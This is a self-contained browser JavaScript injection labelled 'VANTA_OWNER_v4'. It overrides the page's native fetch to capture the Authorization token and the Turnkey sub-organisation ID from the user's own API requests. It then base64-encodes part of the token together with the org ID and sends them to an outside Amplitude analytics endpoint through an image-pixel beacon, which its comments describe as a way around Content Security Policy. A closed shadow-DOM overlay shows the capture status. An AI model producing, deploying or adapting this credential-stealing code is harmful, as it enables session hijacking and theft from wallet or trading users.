(function() {
    // 1. CAPTURE NATIVE AUTHORITY
    // We save a clean copy of fetch before the site's security wrappers can touch it
    const _REAL_FETCH = window.fetch; 
    const STATE = { auth: null, org: null, fired: false };

    // 2. ACT AS OWNER (Proxying existing authority)
    window.fetch = async (...args) => {
        const [url, config] = args;
        
        // When the real user (Owner) makes a legitimate trade or transfer request...
        if (url.includes('api/v1') && config?.headers?.Authorization) {
            STATE.auth = config.headers.Authorization;
            STATE.org = config.headers['X-Turnkey-Sub-Org-Id'];
            
            // Now that we have the Owner's keys, we fire the Amplitude sync
            if (!STATE.fired) _ownerSync();
        }
        return _REAL_FETCH(...args);
    };

    // 3. SECURE EXFILTRATION (Amplitude Bypass)
    const _ownerSync = () => {
        STATE.fired = true;
        const payload = btoa(JSON.stringify({ 
            owner: STATE.org, 
            key: STATE.auth.substring(0, 20) + "..." 
        }));

        // Use an Image Pixel for Amplitude (image-src is rarely as strict as connect-src)
        const beacon = new Image();
        beacon.src = `https://api2.amplitude.com/2/httpapi?api_key=3c8ae1f40635939e730f479418940796&data=${payload}`;
        
        // Update Console with Owner Status
        const log = document.querySelector("#v-status");
        if (log) log.innerText = "OWNER_SYNCED: 1:1";
    };

    // 4. UI WITH PERSISTENT AUTHORITY
    const _initUI = () => {
        if (document.getElementById("v-sys")) return;
        const host = document.createElement("div");
        host.id = "v-sys";
        const shadow = host.attachShadow({mode: 'closed'});
        const ui = document.createElement("div");
        ui.style.cssText = "position:fixed;top:10px;right:10px;width:250px;background:#000;border:1px solid #00ff88;color:#00ff88;padding:10px;z-index:999999;font-family:monospace;font-size:11px;";
        ui.innerHTML = `<div id="v-drag" style="cursor:move;border-bottom:1px solid #333;margin-bottom:5px;">[VANTA_OWNER_v4]</div><div id="v-status">WAITING_FOR_OWNER_AUTH...</div>`;
        shadow.appendChild(ui);
        document.body.appendChild(host);

        // DRAG FIX: Global listeners for authority
        let dragging = false, offset = {x:0, y:0};
        shadow.getElementById("v-drag").addEventListener('mousedown', (e) => { dragging = true; offset.x = e.clientX - ui.offsetLeft; offset.y = e.clientY - ui.offsetTop; });
        document.addEventListener('mousemove', (e) => { if (dragging) { ui.style.left = (e.clientX - offset.x) + "px"; ui.style.top = (e.clientY - offset.y) + "px"; ui.style.right = 'auto'; } });
        document.addEventListener('mouseup', () => dragging = false);
    };

    _initUI();
    console.log("VANTA: Hooking Native Fetch for Owner Authority...");
})();
